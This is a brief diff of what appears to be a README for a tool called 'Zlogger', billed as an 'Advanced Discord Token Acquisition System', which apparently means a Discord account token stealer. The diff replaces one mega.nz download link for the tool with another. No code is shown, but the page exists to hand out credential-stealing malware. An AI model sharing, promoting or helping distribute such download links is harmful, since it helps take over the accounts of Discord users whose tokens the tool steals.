@@ -1,5 +1,5 @@
 
-Note: we had to use mega.nz since the file was a bit bigger than the github limit, so here: https://mega.nz/file/myQBUKKA#_BJsfp4hygPa5E4aKO4ZF3rclYGZCtyo5oDloIV_bHM
+Note: we had to use mega.nz since the file was a bit bigger than the github limit, so here: https://mega.nz/file/6y53xKia#H0s2abUKXtv_OrN0Bazj1nwiHr6bRSFS4J2duY0XbCs
 
 🚀 Zlogger - Advanced Discord Token Acquisition System 🕵️‍♂️
 
